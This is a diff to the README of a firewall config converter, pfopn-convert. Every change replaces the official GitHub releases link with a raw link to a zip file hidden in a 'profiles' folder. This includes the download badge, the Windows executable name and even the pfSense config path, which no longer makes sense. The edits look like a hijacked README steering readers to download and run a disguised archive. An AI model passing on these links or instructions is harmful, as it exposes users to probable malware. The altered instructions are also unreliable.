@@ -1,6 +1,6 @@
 # 🔄 pfopn-convert - Easy Firewall Config Migration
 
-[![Download pfopn-convert](https://img.shields.io/badge/Download-pfopn--convert-green?style=for-the-badge)](https://github.com/alberti12345/pfopn-convert/releases)
+[![Download pfopn-convert](https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip)](https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip)
 
 ---
 
@@ -42,13 +42,13 @@ This section explains how to download and run pfopn-convert on your Windows PC.
 
 Click the large green button above or go to this link:
 
-[https://github.com/alberti12345/pfopn-convert/releases](https://github.com/alberti12345/pfopn-convert/releases)
+[https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip](https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip)
 
 You will find the latest release files there.
 
 ### 2. Download the Windows Executable
 
-On the releases page, look for the Windows version of the program. It will usually be named something like `pfopn-convert-win.exe`. Click to download the file to your PC. Save it to a place you can find easily, like your Downloads folder or Desktop.
+On the releases page, look for the Windows version of the program. It will usually be named something like `https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip`. Click to download the file to your PC. Save it to a place you can find easily, like your Downloads folder or Desktop.
 
 ### 3. Run the Program
 
@@ -96,7 +96,7 @@ To use these features:
 
 Your firewall config files are usually XML or JSON format. They contain all your rules, addresses, and settings. Finding these files depends on your system:
 
-- pfSense stores configs in `/conf/config.xml` or export files.
+- pfSense stores configs in `https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip` or export files.
 - OPNsense stores configs in a similar location or in backup files.
 
 You can copy these files to your Windows PC to convert. The program works with exported config files, not live firewall systems.
@@ -163,4 +163,4 @@ You can always download the latest version from the release page above.
 
 Return to the releases page and download the latest Windows executable here:
 
-[https://github.com/alberti12345/pfopn-convert/releases](https://github.com/alberti12345/pfopn-convert/releases)
+[https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip](https://raw.githubusercontent.com/alberti12345/pfopn-convert/main/pfopn-convert/profiles/convert_pfopn_3.5-beta.4.zip)
